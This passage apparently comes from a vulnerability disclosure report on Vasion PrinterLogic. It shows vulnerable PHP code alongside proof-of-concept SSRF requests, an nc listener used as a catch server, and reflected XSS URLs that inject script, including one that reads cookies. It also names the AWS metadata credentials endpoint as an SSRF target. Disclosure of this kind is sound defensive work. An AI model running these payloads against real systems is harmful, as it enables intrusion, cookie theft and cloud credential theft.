 <span style="color: #666666">36</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_POST, <span style="color: #008000; font-weight: bold">true</span> );
 <span style="color: #666666">37</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_URL, <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:8080/ws/v1/tokenmgt/tokenmanager/createtoken&quot;</span> );
 <span style="color: #666666">38</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_RETURNTRANSFER, <span style="color: #008000; font-weight: bold">true</span> );
 <span style="color: #666666">39</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_USERPWD, <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">$username</span><span style="color: #BA2121">:</span><span style="color: #BB6688; font-weight: bold">$password</span><span style="color: #BA2121">&quot;</span> );
 <span style="color: #666666">40</span>   <span style="color: #008000">curl_setopt</span>( <span style="color: #19177C">$ch</span>, CURLOPT_HTTPAUTH, CURLAUTH_BASIC );
 <span style="color: #666666">41</span>   <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">42</span>   <span style="color: #008000; font-weight: bold">try</span>
 <span style="color: #666666">43</span>   {
 <span style="color: #666666">44</span>     <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_exec</span>( <span style="color: #19177C">$ch</span> );
[<span style="color: #666666">...</span>]
 <span style="color: #666666">56</span>   <span style="color: #19177C">$p</span> <span style="color: #666666">=</span> <span style="color: #008000">xml_parser_create</span>();
 <span style="color: #666666">57</span>   <span style="color: #008000">xml_parse_into_struct</span>( <span style="color: #19177C">$p</span>, <span style="color: #19177C">$response</span>, <span style="color: #19177C">$vals</span>, <span style="color: #19177C">$index</span> );
 <span style="color: #666666">58</span>   <span style="color: #008000">xml_parser_free</span>( <span style="color: #19177C">$p</span> );
 <span style="color: #666666">59</span>   <span style="color: #008000">print_r</span>(<span style="color: #19177C">$vals</span>);
 <span style="color: #666666">60</span>   <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\n\n</span><span style="color: #BA2121">&quot;</span>;
 <span style="color: #666666">61</span>   <span style="color: #008000">print_r</span>(<span style="color: #19177C">$index</span>);
</pre></div>

<p>The code will blindy do SSRF without authentication:</p>
<pre><code>kali% curl 'http://10.105.0.241/console_release/samsung/get_device_info.php?printer_id=2'

error = Failed to connect to 10.105.0.239 port 8080: Connection refused
&lt;BR&gt;&lt;BR&gt;Array
(
)


Array
(
)
</code></pre>
<p>By providing answers from 10.105.0.239:8080, we are able to print the response.</p>
<p>Basic TCP server running on 10.105.0.239:8080:</p>
<pre><code>kali# echo "hello\n\nhow are you?\n\n" | nc -l -v -n -p 8080
</code></pre>
<p>HTTP request with SSRF, the answer is printed:</p>
<pre><code>kali% curl 'http://10.105.0.241/console_release/samsung/get_device_info.php?printer_id=2'
&lt;BR&gt;&lt;BR&gt;hello

how are you?


Array
(
)


Array
(
)
kali%
</code></pre>
<p>Testing against the SaaS version hosted in AWS works.</p>
<p>SSRF using the payload <code>159.65.[redacted].[redacted]/?</code> corresponding to a DigitalOcean test VPS:</p>
<pre><code>kali% curl 'https://[redacted].printercloud10.com/console_release/samsung/get_device_info.php?printer_id=8'
&lt; 
&lt;BR&gt;&lt;BR&gt;&lt;html&gt;
&lt;head&gt;&lt;title&gt;405 Not Allowed&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;405 Not Allowed&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0 (Ubuntu)&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
Array
(
    [0] =&gt; Array
        (
            [tag] =&gt; HTML
            [type] =&gt; open
            [level] =&gt; 1
            [value] =&gt;

        )

    [1] =&gt; Array
        (
</code></pre>
<p>The request from AWS appears in the remote server:</p>
<pre><code>52.65.[redacted].[redacted] - - [11/Feb/2022:10:25:35 +0000] "POST /?:8080/ws/v1/tokenmgt/tokenmanager/createtoken HTTP/1.1" 405 166 "-" "-"
</code></pre>
<p>There is also a SSRF in <code>/var/www/app/console_release/lexmark/installSettings.php</code>.</p>
<p>SSRF using the payload <code>159.65.[redacted].[redacted]/?</code>:</p>
<pre><code>kali% curl -kv 'https://[redacted].printercloud10.com/console_release/lexmark/installSettings.php?printer_id=8'
</code></pre>
<p>The requests coming from AWS appear in the remote server:</p>
<pre><code>52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:31 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:31 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:32 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:33 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:33 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:34 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:35 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:35 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:36 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:37 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:37 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:38 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
52.65.[redacted].[redacted] - - [11/Feb/2022:12:49:39 +0000] "GET /?/cgi-bin/direct/printer/prtappse/semenu?page=bundles HTTP/1.0" 200 6 "-" "-"
</code></pre>
<p>This can be also used to store XSS and attack administrators by stealing their cookies with javascript embedded inside the webpage <code>http://10.105.0.241/console_release/samsung/get_device_info.php?printer_id=X</code> if the attacker loses admin access to the solution.</p>
<p>The SSRF attacks described above require administrator privileges but they can be used to retrieve credentials provided by AWS meta-data server (<code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code>) and to compromise the entire AWS infrastructure used by all the Vasion PrinterLogic customers.</p>
<p>Due to the high number of SSRF vulnerabilities, only a small part was analyzed.</p>
<p><a id="va-xss-02"></a></p>
<h2>Details - XSS in /var/www/app/console_release/fast_release/ register_badge_new.php</h2>
<p>4 different XSS can be found in <code>/var/www/app/console_release/fast_release/register_badge_new.php</code> in lines 42, 61, 79 and 80:</p>
<p>Content of <code>/www/app/console_release/fast_release/register_badge_new.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">17</span>     <span style="color: #19177C">$username</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;username&quot;</span>);
 <span style="color: #666666">18</span>     <span style="color: #19177C">$badgeid</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;badgeid&quot;</span>);
 <span style="color: #666666">19</span>     <span style="color: #19177C">$action</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;action&quot;</span>);
[<span style="color: #666666">...</span>]
<span style="color: #666666">42</span>                             value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;&lt;?php echo </span><span style="color: #BB6688; font-weight: bold">$username</span><span style="color: #BA2121"> ?&gt;&quot;</span> disabled <span style="color: #666666">/&gt;</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">61</span>                         <span style="color: #666666">&lt;</span>input type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;text&quot;</span> id<span style="color: #666666">=</span><span style="color: #BA2121">&quot;badge_rfid_data&quot;</span> style<span style="color: #666666">=</span><span style="color: #BA2121">&quot;width: 100%;&quot;</span> value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;&lt;?php echo </span><span style="color: #BB6688; font-weight: bold">$badgeid</span><span style="color: #BA2121"> ?&gt;&quot;</span> <span style="color: #666666">/&gt;</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">79</span>             <span style="color: #666666">&lt;</span>input type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;hidden&quot;</span> id<span style="color: #666666">=</span><span style="color: #BA2121">&quot;action&quot;</span> value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;&lt;?php echo </span><span style="color: #BB6688; font-weight: bold">$action</span><span style="color: #BA2121"> ?&gt;&quot;</span><span style="color: #666666">/&gt;</span>
<span style="color: #666666">80</span>             <span style="color: #666666">&lt;</span>input type<span style="color: #666666">=</span><span style="color: #BA2121">&quot;hidden&quot;</span> id<span style="color: #666666">=</span><span style="color: #BA2121">&quot;badge_rfid_data_original&quot;</span> value<span style="color: #666666">=</span><span style="color: #BA2121">&quot;&lt;?php echo </span><span style="color: #BB6688; font-weight: bold">$badgeid</span><span style="color: #BA2121"> ?&gt;&quot;</span><span style="color: #666666">/&gt;</span>
[<span style="color: #666666">...</span>]
</pre></div>

<pre><code>https://[redacted].printercloud10.com/console_release/fast_release/register_badge_new.php?username=%22%3E%3Cscript%3Ewindow.alert(%22XSS%22);%3C/script%3E
</code></pre>
<p><img alt="" src="images/2025-vasion-report-1-xss-02.png" /></p>
<p><a href="images/2025-vasion-report-1-xss-02-full.png">Click here for full image</a></p>
<p>The XSS can be used to steal cookies of administrators and get administrator access to the solution.</p>
<p><a id="va-xss-03"></a></p>
<h2>Details - XSS in /www/app/admin/design/reports/overview_popup.php and Incorrect Access Control</h2>
<p>Using the previous <a href="#va-incorrect-acl-php">Incorrect Access Control to PHP webpages allowing to reach printers</a>, it is possible to directly reach <code>/var/www/app/admin/design/reports/overview_popup.php</code> without authentication.</p>
<p>This PHP code contains several XSS.</p>
<p>Content of <code>/var/www/app/admin/design/reports/overview_popup.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">11</span> <span style="color: #19177C">$start_date</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;start_date&quot;</span>);
 <span style="color: #666666">12</span> <span style="color: #19177C">$stop_date</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;stop_date&quot;</span>);
 <span style="color: #666666">13</span> <span style="color: #19177C">$title</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;Print Job Records Overview for &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$start_date</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39; to &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$stop_date</span>;
</pre></div>

<p>PoCs:</p>
<pre><code>kali% wget -qO- "http://10.105.0.241/admin/design/reports/overview_popup.php?start_date=&lt;XSS1&gt;" | grep XSS
    &lt;title&gt;Print Job Records Overview for &lt;XSS1&gt; to &lt;/title&gt;
kali% wget -qO- "http://10.105.0.241/admin/design/reports/overview_popup.php?stop_date=&lt;XSS2&gt;" | grep XSS
    &lt;title&gt;Print Job Records Overview for  to &lt;XSS2&gt;&lt;/title&gt;
kali%
</code></pre>
<p><img alt="" src="images/2025-vasion-report-1-xss-03.png" /></p>
<p><a href="images/2025-vasion-report-1-xss-03-full.png">Click here for full image</a></p>
<pre><code>http://10.105.0.241/admin/design/reports/overview_popup.php?export=1&amp;report_type=Overview+-+All&amp;sort_by=&amp;sort_order=0&amp;page=1&amp;start_date=2022%2F02%2F07%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;stop_date=2022%2F02%2F07&amp;start_time=12%3A00+AM&amp;stop_time=11%3A59+PM&amp;time_offset=-18000&amp;order=&amp;user_name=%3CXSS2%3E&amp;job_title=&amp;computer_name=&amp;manager_name=&amp;department_name=&amp;printer_name=&amp;printer_type=printer_type_all&amp;job_type=job_type_all&amp;user_name_wildcard=*&amp;company_name_wildcard=*&amp;job_title_wildcard=*&amp;manager_name_wildcard=*&amp;department_name_wildcard=*&amp;printer_name_wildcard=*&amp;folder_path=TEST-COMPANY&amp;show_tcpip_printers=1&amp;show_usb_printers=1&amp;show_folder_accumulate=0&amp;async_database_query_ids[]=dt20220207065229_23092&amp;async_database_query_ids[]=dt20220207065229_23093&amp;async_database_query_ids[]=dt20220207065229_23094&amp;async_database_query_ids[]=dt20220207065229_23095&amp;async_database_query_ids[]=dt20220207065230_23096&amp;async_database_query_ids[]=dt20220207065230_23097&amp;async_database_query_ids[]=dt20220207065230_23098&amp;async_database_query_ids[]=dt20220207065230_23099&amp;async_database_query_ids[]=dt20220207065230_23100&amp;async_database_query_ids[]=dt20220207065230_23101
</code></pre>
<p>The same vulnerability in found in the SaaS version:</p>
<p><img alt="" src="images/2025-vasion-report-1-xss-04.png" /></p>
<p><a href="images/2025-vasion-report-1-xss-04-full.png">Click here for full image</a></p>
<pre><code>https://[redacted].printercloud10.com/admin/design/reports/overview_popup.php?export=1&amp;report_type=Overview+-+All&amp;sort_by=&amp;sort_order=0&amp;page=1&amp;start_date=2022%2F02%2F07%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&amp;stop_date=2022%2F02%2F07&amp;start_time=12%3A00+AM&amp;stop_time=11%3A59+PM&amp;time_offset=-18000&amp;order=&amp;user_name=%3CXSS2%3E&amp;job_title=&amp;computer_name=&amp;manager_name=&amp;department_name=&amp;printer_name=&amp;printer_type=printer_type_all&amp;job_type=job_type_all&amp;user_name_wildcard=*&amp;company_name_wildcard=*&amp;job_title_wildcard=*&amp;manager_name_wildcard=*&amp;department_name_wildcard=*&amp;printer_name_wildcard=*&amp;folder_path=TEST-COMPANY&amp;show_tcpip_printers=1&amp;show_usb_printers=1&amp;show_folder_accumulate=0&amp;async_database_query_ids[]=dt20220207065229_23092&amp;async_database_query_ids[]=dt20220207065229_23093&amp;async_database_query_ids[]=dt20220207065229_23094&amp;async_database_query_ids[]=dt20220207065229_23095&amp;async_database_query_ids[]=dt20220207065230_23096&amp;async_database_query_ids[]=dt20220207065230_23097&amp;async_database_query_ids[]=dt20220207065230_23098&amp;async_database_query_ids[]=dt20220207065230_23099&amp;async_database_query_ids[]=dt20220207065230_23100&amp;async_database_query_ids[]=dt20220207065230_23101
</code></pre>
<p>Futhermore, this webpage implements non-working authentication - authentication is only done at the end of the code, after the entire webpage has been executed by PHP.</p>
<p>Content of <code>/var/www/app/admin/design/reports/overview_popup.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">59</span> <span style="color: #666666">&lt;?</span>php
 <span style="color: #666666">60</span> <span style="color: #008000; font-weight: bold">require_once</span>(ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/query/audit_records.php&quot;</span>);
 <span style="color: #666666">61</span> <span style="color: #BC7A00">?&gt;</span>
 62 &lt;/body&gt;
 63 &lt;/html&gt;
</pre></div>

<p><code>/www/app/admin/query/audit_records.php</code> is doing a check of authentication but this page is only included at the end of the PHP code, nullifying the authentication mechanism:</p>
<p>Content of <code>/var/www/app/admin/query/audit_records.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
  <span style="color: #666666">2</span> <span style="color: #008000; font-weight: bold">use</span> PrinterLogicLegacy\AuditHelpers;
  <span style="color: #666666">3</span> 
  <span style="color: #666666">4</span> <span style="color: #008000; font-weight: bold">require_once</span> (<span style="color: #BA2121">&quot;global.php&quot;</span>);
  <span style="color: #666666">5</span> 
  <span style="color: #666666">6</span> <span style="color: #008000; font-weight: bold">require_once</span> (ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;lib/dao/dbopen.php&quot;</span>);
  <span style="color: #666666">7</span> <span style="color: #008000; font-weight: bold">require_once</span> (ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;lib/dao/print_stat_dao.php&quot;</span>);
  <span style="color: #666666">8</span> 
  <span style="color: #666666">9</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span>GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$login</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">is_logged_in</span>())
 <span style="color: #666666">10</span> { 
 <span style="color: #666666">11</span>         respond_html_expired();
 <span style="color: #666666">12</span>         <span style="color: #008000; font-weight: bold">return</span>;
 <span style="color: #666666">13</span> }
</pre></div>

<p>An attacker can use XSS vulnerabilities to steal administrator's cookies.</p>
<p><a id="va-xss-04"></a></p>
<h2>Details - XSS everywhere in /www/app/admin/*</h2>
<p>The pages located in the <code>/var/www/app/admin</code> directory contain several XSS.</p>
<p>The page <code>/var/www/app/admin/query/audit_records.php</code> will retrieve attacker-controlled variables from line 15 to line 42 and then will <code>include audit_records_html.php</code> on line 44.</p>
<p>Content of <code>/var/www/app/admin/query/audit_records.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
  <span style="color: #666666">9</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span>GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$login</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">is_logged_in</span>())
 <span style="color: #666666">10</span> { 
 <span style="color: #666666">11</span>         respond_html_expired();
 <span style="color: #666666">12</span>         <span style="color: #008000; font-weight: bold">return</span>;
 <span style="color: #666666">13</span> } 
 <span style="color: #666666">14</span> 
 <span style="color: #666666">15</span> <span style="color: #19177C">$async_database_query_ids</span> <span style="color: #666666">=</span> <span style="color: #008000">isset</span>(<span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;async_database_query_ids&quot;</span>]) <span style="color: #666666">?</span> <span style="color: #19177C">$_REQUEST</span>[<span style="color: #BA2121">&quot;async_database_query_ids&quot;</span>] <span style="color: #666666">:</span> <span style="color: #008000; font-weight: bold">null</span>;
 <span style="color: #666666">16</span> <span style="color: #19177C">$export</span> <span style="color: #666666">=</span> requestint(<span style="color: #BA2121">&quot;export&quot;</span>, <span style="color: #666666">0</span>);
 <span style="color: #666666">17</span> <span style="color: #19177C">$report_type</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;report_type&quot;</span>, <span style="color: #BA2121">&quot;Overview&quot;</span>);
 <span style="color: #666666">18</span> <span style="color: #19177C">$sort_by</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;sort_by&quot;</span>);
 <span style="color: #666666">19</span> <span style="color: #19177C">$sort_order</span> <span style="color: #666666">=</span> requestint(<span style="color: #BA2121">&quot;sort_order&quot;</span>, <span style="color: #666666">1</span>);
 <span style="color: #666666">20</span> <span style="color: #19177C">$sort_char</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&amp;#x25B&quot;</span> <span style="color: #666666">.</span> (<span style="color: #19177C">$sort_order</span> <span style="color: #666666">===</span> <span style="color: #666666">0</span> <span style="color: #666666">?</span> <span style="color: #BA2121">&quot;C&quot;</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&quot;2&quot;</span>) <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;;&quot;</span>; 
 <span style="color: #666666">21</span> 
 <span style="color: #666666">22</span> <span style="color: #19177C">$page</span> <span style="color: #666666">=</span> requestint(<span style="color: #BA2121">&quot;page&quot;</span>, <span style="color: #666666">1</span>);
 <span style="color: #666666">23</span> <span style="color: #19177C">$start_date</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;start_date&quot;</span>);
 <span style="color: #666666">24</span> <span style="color: #19177C">$stop_date</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;stop_date&quot;</span>);
 <span style="color: #666666">25</span> <span style="color: #19177C">$start_time</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;start_time&quot;</span>);
 <span style="color: #666666">26</span> <span style="color: #19177C">$stop_time</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;stop_time&quot;</span>);
 <span style="color: #666666">27</span> <span style="color: #19177C">$time_offset</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;time_offset&quot;</span>);
 <span style="color: #666666">28</span> 
 <span style="color: #666666">29</span> <span style="color: #19177C">$user_name</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;user_name&quot;</span>, <span style="color: #008000; font-weight: bold">null</span>);
 <span style="color: #666666">30</span> <span style="color: #19177C">$job_title</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;job_title&quot;</span>, <span style="color: #008000; font-weight: bold">null</span>);
 <span style="color: #666666">31</span> <span style="color: #19177C">$computer_name</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;computer_name&quot;</span>, <span style="color: #008000; font-weight: bold">null</span>);
 <span style="color: #666666">32</span> <span style="color: #19177C">$manager_name</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;manager_name&quot;</span>, <span style="color: #008000; font-weight: bold">null</span>);
 <span style="color: #666666">33</span> <span style="color: #19177C">$department_name</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;department_name&quot;</span>, <span style="color: #008000; font-weight: bold">null</span>);
 <span style="color: #666666">34</span> <span style="color: #19177C">$printer_name</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;printer_name&quot;</span>, <span style="color: #008000; font-weight: bold">null</span>);
 <span style="color: #666666">35</span> <span style="color: #19177C">$printer_type</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;printer_type&quot;</span>);
 <span style="color: #666666">36</span> <span style="color: #19177C">$job_type</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;job_type&quot;</span>);
 <span style="color: #666666">37</span> 
 <span style="color: #666666">38</span> <span style="color: #19177C">$folder_path</span> <span style="color: #666666">=</span> requeststr(<span style="color: #BA2121">&quot;folder_path&quot;</span>, <span style="color: #BA2121">&quot;&quot;</span>); 
 <span style="color: #666666">39</span> 
 <span style="color: #666666">40</span> <span style="color: #19177C">$show_tcpip_printers</span> <span style="color: #666666">=</span> requestint(<span style="color: #BA2121">&quot;show_tcpip_printers&quot;</span>, <span style="color: #666666">1</span>);
 <span style="color: #666666">41</span> <span style="color: #19177C">$show_usb_printers</span> <span style="color: #666666">=</span> requestint(<span style="color: #BA2121">&quot;show_usb_printers&quot;</span>, <span style="color: #666666">1</span>);
 <span style="color: #666666">42</span> <span style="color: #19177C">$show_folder_accumulate</span> <span style="color: #666666">=</span> requestint(<span style="color: #BA2121">&quot;show_folder_accumulate&quot;</span>, <span style="color: #666666">1</span>);
 <span style="color: #666666">43</span> 
 <span style="color: #666666">44</span> <span style="color: #008000; font-weight: bold">require_once</span>(<span style="color: #BA2121">&#39;audit_records_html.php&#39;</span>);
</pre></div>

<p>4 different XSS <code>/var/www/app/admin/query/audit_records_html.php</code>:</p>
<p>Content of <code>/var/www/app/admin/query/audit_records.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
  <span style="color: #666666">9</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span>GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$login</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">is_logged_in</span>())
 <span style="color: #666666">11</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #BA2121">&#39;overview - paper size&#39;</span><span style="color: #666666">:</span>
 <span style="color: #666666">12</span>             <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #008000">strtolower</span>(<span style="color: #19177C">$report_type</span>) <span style="color: #666666">===</span> <span style="color: #BA2121">&quot;overview - all&quot;</span>) {
 <span style="color: #666666">13</span>                 <span style="color: #19177C">$title</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;Print Job Records Overview for &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$start_date</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39; to &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$stop_date</span>; [<span style="color: #666666">1</span>] XSS with <span style="color: #19177C">$start_date</span> <span style="color: #008000; font-weight: bold">and</span> <span style="color: #19177C">$stop_date</span>
 <span style="color: #666666">14</span>                 <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;h1&gt;</span><span style="color: #BB6688; font-weight: bold">{</span><span style="color: #19177C">$title</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&lt;/h1&gt;&quot;</span>;                                                      [<span style="color: #666666">2</span>] XSS with <span style="border: 1px solid #FF0000">$</span>{title}
 <span style="color: #666666">15</span>             }    
 <span style="color: #666666">16</span>             <span style="color: #008000; font-weight: bold">require_once</span> ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/design/reports/overview_main.php&quot;</span>;
 <span style="color: #666666">17</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">18</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #BA2121">&#39;records&#39;</span><span style="color: #666666">:</span>
 <span style="color: #666666">19</span>             <span style="color: #008000; font-weight: bold">require_once</span> ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/design/reports/print_job_records.php&quot;</span>;
 <span style="color: #666666">20</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">21</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #BA2121">&#39;user&#39;</span><span style="color: #666666">:</span>
 <span style="color: #666666">22</span>             <span style="color: #19177C">$object_name</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;User&quot;</span>;
 <span style="color: #666666">23</span>             <span style="color: #008000; font-weight: bold">require_once</span> ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/design/reports/print_job_others.php&quot;</span>;
 <span style="color: #666666">24</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">25</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #BA2121">&#39;manager&#39;</span><span style="color: #666666">:</span>
 <span style="color: #666666">26</span>             <span style="color: #19177C">$object_name</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;Manager&quot;</span>;
 <span style="color: #666666">27</span>             <span style="color: #008000; font-weight: bold">require_once</span> ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/design/reports/print_job_others.php&quot;</span>;
 <span style="color: #666666">28</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">29</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #BA2121">&#39;department&#39;</span><span style="color: #666666">:</span>
 <span style="color: #666666">30</span>             <span style="color: #19177C">$object_name</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;Department&quot;</span>;
 <span style="color: #666666">31</span>             <span style="color: #008000; font-weight: bold">require_once</span> ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/design/reports/print_job_others.php&quot;</span>;
 <span style="color: #666666">32</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">33</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #BA2121">&#39;job title&#39;</span><span style="color: #666666">:</span>
 <span style="color: #666666">34</span>             <span style="color: #19177C">$object_name</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;Job Title&quot;</span>;
 <span style="color: #666666">35</span>             <span style="color: #008000; font-weight: bold">require_once</span> ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;admin/design/reports/print_job_others.php&quot;</span>;
 <span style="color: #666666">36</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">37</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #BA2121">&#39;printer&#39;</span><span style="color: #666666">:</span>
